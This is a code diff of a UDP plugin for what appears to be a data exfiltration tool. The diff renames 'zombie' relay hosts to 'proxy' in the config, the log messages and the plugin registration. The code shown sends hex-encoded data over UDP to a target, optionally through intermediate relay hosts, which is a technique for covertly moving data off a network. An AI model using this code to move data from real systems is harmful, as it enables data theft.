@@ -7,8 +7,8 @@ app_exfiltrate = None
 
 
 def send(data):
-    if config.has_key('zombies') and config['zombies'] != [""]:
-        targets = [config['target']] + config['zombies']
+    if config.has_key('proxies') and config['proxies'] != [""]:
+        targets = [config['target']] + config['proxies']
         target = choice(targets)
     else:
         target = config['target']
@@ -61,13 +61,13 @@ def relay_dns_packet(data):
     target = config['target']
     port = config['port']
     app_exfiltrate.log_message(
-        'info', "[zombie] [udp] Relaying {0} bytes to {1}".format(len(data), target))
+        'info', "[proxy] [udp] Relaying {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     client_socket.sendto(data.encode('hex'), (target, port))
 
-def zombie():
+def proxy():
     app_exfiltrate.log_message(
-            'info', "[zombie] [udp] Listening for udp packets")
+            'info', "[proxy] [udp] Listening for udp packets")
     sniff(handler=relay_dns_packet)
 
 
@@ -78,4 +78,4 @@ class Plugin:
         global app_exfiltrate
         config = conf
         app_exfiltrate = app
-        app.register_plugin('udp', {'send': send, 'listen': listen, 'zombie': zombie})
+        app.register_plugin('udp', {'send': send, 'listen': listen, 'proxy': proxy})
